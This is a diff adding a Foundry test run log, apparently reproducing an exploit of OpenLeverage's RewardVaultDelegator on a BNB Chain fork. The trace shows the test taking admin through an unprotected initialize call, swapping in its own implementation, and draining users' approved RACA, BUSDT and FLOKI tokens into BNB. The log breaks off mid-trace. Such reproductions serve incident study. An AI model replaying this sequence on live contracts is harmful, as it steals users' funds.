@@ -1,0 +1,579 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/OpenLeverage_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1095199)
+Logs:
+  Attacker BNB balance before exploit: 0.000000000000000000
+  Original admin address (Open Leverage Deployer): 0xE9547CF7E592F83C5141bB50648317e35D27D29B
+  Admin address after calling initialize func (admin change): 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+  Attacker BNB balance after exploit: 37.136665551377188920
+
+Traces:
+  [10827] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 32820951 [3.282e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], "RewardVaultDelegator")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(RACA: [0x12BB890508c125661E03b09EC06E404bc9289040], "RACA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BUSDT: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], "BUSDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FLOKI: [0xfb5B838b6cfEEdC2873aB27866079AC55363D37E], "FLOKI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(OLE: [0xa865197A84E780957422237B5D152772654341F3], "OLE")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CSIX: [0x04756126F044634C9a0f0E985e60c88a51ACC206], "CSIX")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BABY: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], "BABY")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B], "openLeverageDeployer")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1374264] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker BNB balance before exploit", val: 0, decimals: 18)
+    ├─ [2425] RewardVaultDelegator::admin() [staticcall]
+    │   └─ ← [Return] openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B]
+    ├─ [0] VM::assertEq(openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B], openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [425] RewardVaultDelegator::admin() [staticcall]
+    │   └─ ← [Return] openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B]
+    ├─ emit log_named_address(key: "Original admin address (Open Leverage Deployer)", val: openLeverageDeployer: [0xE9547CF7E592F83C5141bB50648317e35D27D29B])
+    ├─ [13974] RewardVaultDelegator::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   ├─ [8778] 0x3D11015d9044cAbBB2504448e37f20d0d56E36F8::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 10: 0x0000000059558b7d604675a4cc9eb36c67f159550f73bf9a000000000076a700 → 0x000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000001
+    │   │   │   @ 1: 0x000000000000000000000000e9547cf7e592f83c5141bb50648317e35d27d29b → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [425] RewardVaultDelegator::admin() [staticcall]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] VM::assertEq(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [425] RewardVaultDelegator::admin() [staticcall]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ emit log_named_address(key: "Admin address after calling initialize func (admin change)", val: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    ├─ [4933] RewardVaultDelegator::setImplementation(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ emit NewImplementation(oldImplementation: 0x3D11015d9044cAbBB2504448e37f20d0d56E36F8, newImplementation: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 0: 0x0000000000000000000000003d11015d9044cabbb2504448e37f20d0d56e36f8 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [1329672] RewardVaultDelegator::a(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [1328988] ContractTest::a(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [24682] RACA::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7b8d0d7fa70ed8683ec61e2c0c23191c7c31dc651046c6a42920bed5eb3ddb9e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2563] RACA::balanceOf(0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B) [staticcall]
+    │   │   │   └─ ← [Return] 28246878428989627474413838 [2.824e25]
+    │   │   ├─ [2665] RACA::allowance(0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640555039457584007913129639935 [1.157e77]
+    │   │   ├─ [21271] RACA::transferFrom(0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 28246878428989627474413838 [2.824e25])
+    │   │   │   ├─ emit Transfer(from: 0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B, to: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 28246878428989627474413838 [2.824e25])
+    │   │   │   ├─ emit Approval(owner: 0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B, spender: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 115792089237316195423570985008687907853269984665640526792579155018285655226097 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x4ac144e787380d6180b10cddc65eaa0d4cc2c79958b946c372ecf5d021b17a83: 0xfffffffffffffffffffffffffffffffffffffffffff88e2d05bacba556ffffff → 0xffffffffffffffffffffffffffffffffffffffffffe130aaaca8b5909e5776f1
+    │   │   │   │   @ 0x9edcf7003a03fbed2d3f55f5925274e828a6bc554cd2ff6306ef5603865f27cb: 0x000000000000000000000000000000000000000000078492955f7aa366bafc10 → 0x0000000000000000000000000000000000000000001ee214ee7190b81f63851e
+    │   │   │   │   @ 0x6926dcf00cb6a8188daa64d893615bfa7ebddd2583ed1e604b673ccbe68f67b8: 0x000000000000000000000000000000000000000000175d8259121614b8a8890e → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [563] RACA::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 37335415530122063120663838 [3.733e25]
+    │   │   ├─ [110447] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(37335415530122063120663838 [3.733e25], 0, [0x12BB890508c125661E03b09EC06E404bc9289040, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [13671] RACA::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0xC016F93D1b11878804c345e93C8588794480CD83, 37335415530122063120663838 [3.733e25])
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0xC016F93D1b11878804c345e93C8588794480CD83, value: 37335415530122063120663838 [3.733e25])
+    │   │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640526704042053885850008976097 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x9edcf7003a03fbed2d3f55f5925274e828a6bc554cd2ff6306ef5603865f27cb: 0x0000000000000000000000000000000000000000001ee214ee7190b81f63851e → 0
+    │   │   │   │   │   @ 0xe2c3ce4799177438c6857a70c043d85a652adb8bc2f9f3cbbb88f0783e4fbd1d: 0x00000000000000000000000000000000000000000f2db8026c84d12e28c666f7 → 0x00000000000000000000000000000000000000000f4c9a175af661e64829ec15
+    │   │   │   │   │   @ 0x7b8d0d7fa70ed8683ec61e2c0c23191c7c31dc651046c6a42920bed5eb3ddb9e: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffe11deb118e6f47e09c7ae1
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2893] 0xC016F93D1b11878804c345e93C8588794480CD83::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 4697545769348775355076732663 [4.697e27], 3565848902095608101400 [3.565e21], 1697963090 [1.697e9]
+    │   │   │   ├─ [563] RACA::balanceOf(0xC016F93D1b11878804c345e93C8588794480CD83) [staticcall]
+    │   │   │   │   └─ ← [Return] 4734881184878897418197396501 [4.734e27]
+    │   │   │   ├─ [66871] 0xC016F93D1b11878804c345e93C8588794480CD83::swap(0, 28047638808954869572 [2.804e19], Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [29962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 28047638808954869572 [2.804e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xC016F93D1b11878804c345e93C8588794480CD83, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 28047638808954869572 [2.804e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf8b372b53b7dc307ceba9b2e42e242a760f59cc0af272b5eb0cad4fea92190e6: 0x0000000000000000000000000000000000000000000000c14e182bc75d623a18 → 0x0000000000000000000000000000000000000000000000bfc8daf0e2812b22d4
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000001853d3ae4dc371744
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [563] RACA::balanceOf(0xC016F93D1b11878804c345e93C8588794480CD83) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4734881184878897418197396501 [4.734e27]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0xC016F93D1b11878804c345e93C8588794480CD83) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3537801263286653231828 [3.537e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 4734881184878897418197396501 [4.734e27], reserve1: 3537801263286653231828 [3.537e21])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 37335415530122063120663838 [3.733e25], amount1In: 0, amount0Out: 0, amount1Out: 28047638808954869572 [2.804e19], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 9: 0x00000000000000000000000000000000009570e2dfab8539a83166d93803d2e8 → 0x00000000000000000000000000000000009570e8259eb7467807bb35204b57c2
+    │   │   │   │   │   @ 8: 0x6534dc520000000000c14e182bc75d623a1800000f2db8026c84d12e28c666f7 → 0x6534dcbc0000000000bfc8daf0e2812b22d400000f4c9a175af661e64829ec15
+    │   │   │   │   │   @ 10: 0x0000000000000000000000004400cf51c4ae6570befe2fe09788db6ec7aa8093 → 0x0000000000000000000000004400d7a48697806e10e72ede37186b6e38d12111
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 28047638808954869572 [2.804e19]
+    │   │   │   ├─ [9223] WBNB::withdraw(28047638808954869572 [2.804e19])
+    │   │   │   │   ├─ [83] Router::fallback{value: 28047638808954869572}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 28047638808954869572 [2.804e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000001853d3ae4dc371744 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] ContractTest::receive{value: 28047638808954869572}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24562] BUSDT::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2531] BUSDT::balanceOf(0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6) [staticcall]
+    │   │   │   └─ ← [Return] 353159699582865929 [3.531e17]
+    │   │   ├─ [2638] BUSDT::allowance(0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 224922137071076982 [2.249e17]
+    │   │   ├─ [16434] BUSDT::transferFrom(0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 224922137071076982 [2.249e17])
+    │   │   │   ├─ emit Transfer(from: 0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6, to: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 224922137071076982 [2.249e17])
+    │   │   │   ├─ emit Approval(owner: 0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6, spender: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x90baa12f5501a2c74e4d379a77ae786191ada734f14bf70a076f9df8fe256e42: 0x000000000000000000000000000000000000000000000045d29737e22f200000 → 0x000000000000000000000000000000000000000000000045d5b64d60215e4676
+    │   │   │   │   @ 0xdc405ace79461ad6a74f0b9fda51a2f23423e129cc1c7eeccbab13f43c92d107: 0x000000000000000000000000000000000000000000000000031f157df23e4676 → 0
+    │   │   │   │   @ 0xe5d76cc81f4138e435f295e58a387a3447ca6d7bcd8c825a46c354a529d40be5: 0x00000000000000000000000000000000000000000000000004e6ace02a9ed209 → 0x00000000000000000000000000000000000000000000000001c7976238608b93
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] BUSDT::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 1288224922137071076982 [1.288e21]
+    │   │   ├─ [103096] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1288224922137071076982 [1.288e21], 0, [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [10834] BUSDT::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 1288224922137071076982 [1.288e21])
+    │   │   │   │   ├─ emit Transfer(from: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], to: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, value: 1288224922137071076982 [1.288e21])
+    │   │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564038169359085776058562953 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x90baa12f5501a2c74e4d379a77ae786191ada734f14bf70a076f9df8fe256e42: 0x000000000000000000000000000000000000000000000045d5b64d60215e4676 → 0
+    │   │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffba2a49b29fdea1b989
+    │   │   │   │   │   @ 0x3f78ef6f0a13ff5ebe2099feb686bb1e55bae2ea947609b08baac59bc1bf58b8: 0x00000000000000000000000000000000000000000006c80265bf76c75370b3b3 → 0x00000000000000000000000000000000000000000006c8483b75c42774cefa29
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2893] 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 38177239773717696978320 [3.817e22], 8198072439459168363000755 [8.198e24], 1697963184 [1.697e9]
+    │   │   │   ├─ [531] BUSDT::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   │   │   └─ ← [Return] 8199360664381305434077737 [8.199e24]
+    │   │   │   ├─ [62339] 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16::swap(5983141958587292554 [5.983e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   ├─ [27962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 5983141958587292554 [5.983e18])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 5983141958587292554 [5.983e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf1e03e4973193f89f2aa083d30a49755f07deae26a230485fdc9f8acee2c766f: 0x00000000000000000000000000000000000000000000081597a1f682cdb19d90 → 0x00000000000000000000000000000000000000000000081544999299835d0206
+    │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000530863e94a549b8a
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 38171256631759109685766 [3.817e22]
+    │   │   │   │   ├─ [531] BUSDT::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8199360664381305434077737 [8.199e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 38171256631759109685766 [3.817e22], reserve1: 8199360664381305434077737 [8.199e24])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1288224922137071076982 [1.288e21], amount0Out: 5983141958587292554 [5.983e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 10: 0x00000000000000000000000000000003cf85313c110629586c17d3692407c2ce → 0x00000000000000000000000000000003cf853f8a5de5a00e183dec87bcac012a
+    │   │   │   │   │   @ 9: 0x00000000000000000000000000064747c1f119db2d4d9662069f6d117f714bcd → 0x00000000000000000000000000064747cc01f271809e3f27c9f4e3347f5ce40d
+    │   │   │   │   │   @ 8: 0x6534dcb000000006c80265bf76c75370b3b300000000081597a1f682cdb19d90 → 0x6534dcbc00000006c8483b75c42774cefa2900000000081544999299835d0206
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5983141958587292554 [5.983e18]
+    │   │   │   ├─ [9223] WBNB::withdraw(5983141958587292554 [5.983e18])
+    │   │   │   │   ├─ [83] Router::fallback{value: 5983141958587292554}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 5983141958587292554 [5.983e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000530863e94a549b8a → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] ContractTest::receive{value: 5983141958587292554}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24666] FLOKI::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5dd0d100d6ef599f20166740b2e71d0223f85b731eb6539d6e1b9d28f50e794b: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2605] FLOKI::balanceOf(0x0D413496d1cb149B1526609363359ED398741901) [staticcall]
+    │   │   │   └─ ← [Return] 8760932151373215 [8.76e15]
+    │   │   ├─ [2770] FLOKI::allowance(0x0D413496d1cb149B1526609363359ED398741901, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457561007913129639935 [1.157e77]
+    │   │   ├─ [52038] FLOKI::transferFrom(0x0D413496d1cb149B1526609363359ED398741901, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 8760932151373215 [8.76e15])
+    │   │   │   ├─ [7885] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::beforeTransferHandler(0x0D413496d1cb149B1526609363359ED398741901, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 8760932151373215 [8.76e15])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [11887] 0xbBD372407eaD5729657Aeb2DEB86468a0d593520::getTax(0x0D413496d1cb149B1526609363359ED398741901, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 8760932151373215 [8.76e15]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [743] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::afterTransferHandler(0x0D413496d1cb149B1526609363359ED398741901, RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 8760932151373215 [8.76e15])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Transfer(from: 0x0D413496d1cb149B1526609363359ED398741901, to: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 8760932151373215 [8.76e15])
+    │   │   │   ├─ emit Approval(owner: 0x0D413496d1cb149B1526609363359ED398741901, spender: RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], value: 115792089237316195423570985008687907853269984665640564039457552246980978266720 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x90baa12f5501a2c74e4d379a77ae786191ada734f14bf70a076f9df8fe256e42: 0x000000000000000000000000000000000000000000000000000cb864051683e1 → 0x000000000000000000000000000000000000000000000000002bd8697ddf3180
+    │   │   │   │   @ 0x5c50a8a7865d656f62430200d38a39a87916450af9eec56de4b8bfb859e48285: 0xffffffffffffffffffffffffffffffffffffffffffffffffffae499f322a7fff → 0xffffffffffffffffffffffffffffffffffffffffffffffffff8f2999b961d260
+    │   │   │   │   @ 0x8144a59cd4a71b8ff9f2ef18d893e9e0c42a6c80771179bd15ba633a2bb2edc9: 0x000000000000000000000000000000000000000000000000001f200578c8ad9f → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [605] FLOKI::balanceOf(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887]) [staticcall]
+    │   │   │   └─ ← [Return] 12341371593503104 [1.234e16]
+    │   │   ├─ [431984] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(12341371593503104 [1.234e16], 0, [0xfb5B838b6cfEEdC2873aB27866079AC55363D37E, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1697964196 [1.697e9])
+    │   │   │   ├─ [368158] FLOKI::transferFrom(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x231d9e7181E8479A8B40930961e93E7ed798542C, 12341371593503104 [1.234e16])
+    │   │   │   │   ├─ [338050] 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88::beforeTransferHandler(RewardVaultDelegator: [0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887], 0x231d9e7181E8479A8B40930961e93E7ed798542C, 12341371593503104 [1.234e16])
+    │   │   │   │   │   ├─ [2605] FLOKI::balanceOf(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 133058642767542 [1.33e14]
+    │   │   │   │   │   ├─ [2605] FLOKI::balanceOf(0x231d9e7181E8479A8B40930961e93E7ed798542C) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 80679800426880632984 [8.067e19]
+    │   │   │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   │   │   ├─ [24666] FLOKI::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 119752778490788 [1.197e14])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 119752778490788 [1.197e14])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xafb6909aa212f9dd2b6efb2b676416de842c3e87d0e64d5e2d832aca11863f04: 0 → 0x00000000000000000000000000000000000000000000000000006cea1dd2a3a4
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [116422] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(119752778490788 [1.197e14], 0, [0xfb5B838b6cfEEdC2873aB27866079AC55363D37E, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 1697963196 [1.697e9])
+    │   │   │   │   │   │   ├─ [24012] FLOKI::transferFrom(0xaBbee6E231010dE7AAEDfc4a8F18e5E1D6f92D88, 0x231d9e7181E8479A8B40930961e93E7ed798542C, 119752778490788 [1.197e14])
